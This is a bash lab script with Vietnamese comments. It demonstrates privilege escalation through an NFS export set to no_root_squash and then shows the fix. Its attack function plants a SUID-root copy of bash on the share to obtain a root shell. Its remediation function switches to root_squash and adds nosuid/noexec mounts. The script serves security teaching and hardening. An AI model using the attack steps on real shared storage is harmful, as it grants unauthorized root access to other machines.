#!/bin/bash
###############################################################################
# privesc-no-root-squash.sh
# Demo kich ban rui ro bao mat khi bat "no_root_squash" tren NFS export,
# va cach khac phuc.
#
# Boi canh (theo /etc/exports cua TV2):
#   /exports/no_squash  192.168.10.0/24(rw,sync,fsid=2,no_subtree_check,no_root_squash)
#
# Co che tan cong:
#   Mac dinh, NFS "squash" (anh xa) user root tren CLIENT thanh user "nobody"
#   (root_squash) khi ghi vao SERVER, de root tren client KHONG duoc coi la
#   root tren server. Khi export bat "no_root_squash", root tren client duoc
#   GIU NGUYEN quyen root tren server. Ke tan cong chi can co quyen root tren
#   MOT client bat ky (VM ca nhan, container, laptop) co the ket noi toi share
#   la du, khong can biet mat khau cua server.
#
#   Khai thac pho bien: tao mot file thuc thi thuoc so huu root, gan bit SUID,
#   dat vao thu muc share. Vi thu muc nam tren server, file se thuc su duoc
#   tao voi UID=0 tren server. Bat ky user thuong nao (kem ca tren client
#   khac, hoac chinh server neu co shell) chay file nay se duoc EUID=root.
#
# CHI CHAY TRONG MOI TRUONG LAB (docker-nfs), KHONG CHAY TREN HE THONG THAT.
###############################################################################
set -euo pipefail

NFS_SERVER="192.168.10.11"
# "/exports" tren server la pseudo-root NFSv4 (fsid=0) -> dung "/no_squash"
# tuong doi, khong dung duong dan dia that "/exports/no_squash".
VULN_EXPORT="/no_squash"
MOUNT_POINT="/mnt/nfs/no_squash"
PAYLOAD_NAME="svc-helper"     # dat ten "vo hai" de mo phong thuc te

step() { echo; echo "### $1"; }

########################################
# PHAN A: TAN CONG (chay voi quyen root tren CLIENT, vi du client-rw)
########################################
attack() {
    step "[A1] Mount export dang bi loi cau hinh (no_root_squash)"
    mkdir -p "${MOUNT_POINT}"
    mount -t nfs4 -o vers=4.2,sec=sys,rw "${NFS_SERVER}:${VULN_EXPORT}" "${MOUNT_POINT}"
    mount | grep no_squash

    step "[A2] Tao binary SUID-root tu quyen root cua CLIENT"
    cp /bin/bash "${MOUNT_POINT}/${PAYLOAD_NAME}"
    chown root:root "${MOUNT_POINT}/${PAYLOAD_NAME}"
    chmod 4755 "${MOUNT_POINT}/${PAYLOAD_NAME}"
    echo "Chu so huu & quyen cua payload tren export (goc nhin client):"
    ls -l "${MOUNT_POINT}/${PAYLOAD_NAME}"

    step "[A3] Mo phong: user KHONG co quyen (vd 'attacker') chay payload"
    echo "  (tren thuc te, buoc nay co the thuc hien tu BAT KY client nao"
    echo "   khac cung mount duoc /exports/no_squash, voi user thuong)"
    echo "  Lenh minh hoa: su attacker -c '${MOUNT_POINT}/${PAYLOAD_NAME} -p'"
    echo "  => Vi bit SUID + chu so huu root duoc giu nguyen do no_root_squash,"
    echo "     user 'attacker' se nhan duoc shell voi EUID=0 (root) tren he thong"
    echo "     dang chay payload do, du ban dau khong co quyen root."

    echo
    echo ">>> KET LUAN: Chi can chiem duoc quyen root tren MOT client duoc phep"
    echo "    mount share nay, ke tan cong co the gian tiep chiem quyen root"
    echo "    tren BAT KY may nao khac cung mount duoc export, thong qua payload"
    echo "    SUID dat san tren share dung chung."
}

########################################
# PHAN B: KHAC PHUC (chay tren NFS SERVER)
########################################
remediate() {
    step "[B1] Don dep payload da tao (chay tren client da mount)"
    rm -f "${MOUNT_POINT}/${PAYLOAD_NAME}" 2>/dev/null || true
    umount "${MOUNT_POINT}" 2>/dev/null || true

    step "[B2] Sua /etc/exports tren SERVER: bo no_root_squash"
    cat <<'EOF'
Truoc (khong an toan):
  /exports/no_squash  192.168.10.0/24(rw,sync,fsid=2,no_subtree_check,no_root_squash)

Sau (khuyen nghi - buoc 1, muc toi thieu):
  /exports/no_squash  192.168.10.0/24(rw,sync,fsid=2,no_subtree_check,root_squash)

An toan hon nua neu share khong can phan biet user (buoc 2, tuy chon):
  /exports/no_squash  192.168.10.0/24(rw,sync,fsid=2,no_subtree_check,all_squash,anonuid=65534,anongid=65534)
  # all_squash: anh xa TAT CA user (ke ca user thuong) ve anonuid/anongid,
  # phu hop cho cac share public chi can ghi/doc, khong can phan quyen theo UID.

Khuyen nghi bo sung khi mount tren client (giam be mat tan cong o tang client):
  mount -o ...,nosuid,noexec 192.168.10.11:/exports/no_squash /mnt/...
  # nosuid : vo hieu hoa bit SUID/SGID cua file tren filesystem duoc mount,
  #          chinh la "hang phong thu thu 2" chan dung ky thuat demo o tren
  #          ngay ca khi server cau hinh sai.
  # noexec : neu share chi dung de luu du lieu, khong can thuc thi binary.
EOF

    step "[B3] Ap dung thay doi tren SERVER va kiem chung"
    echo "Lenh thuc hien tren server (nfs-node1):"
    echo "  sudo sed -i 's/no_root_squash/root_squash/' /etc/exports"
    echo "  sudo exportfs -ra"
    echo "  sudo exportfs -v      # xac nhan option 'root_squash' da ap dung"

    step "[B4] Kiem chung lai tren CLIENT - tan cong phai that bai"
    echo "Lap lai buoc A2: file SUID tao tu client gio se bi anh xa UID ve"
    echo "'nobody' (65534) tren server thay vi giu UID=0, nen bit SUID khong"
    echo "con cho root nua -> khong the leo thang dac quyen theo cach cu."
}

MODE="${1:-}"
case "${MODE}" in
  attack)     attack ;;
  remediate)  remediate ;;
  *)
    cat <<USAGE
Cach dung:
  $0 attack       # chay tren client, mo phong khai thac no_root_squash
  $0 remediate    # in huong dan + lenh khac phuc tren server, va don dep client
USAGE
    exit 1
    ;;
esac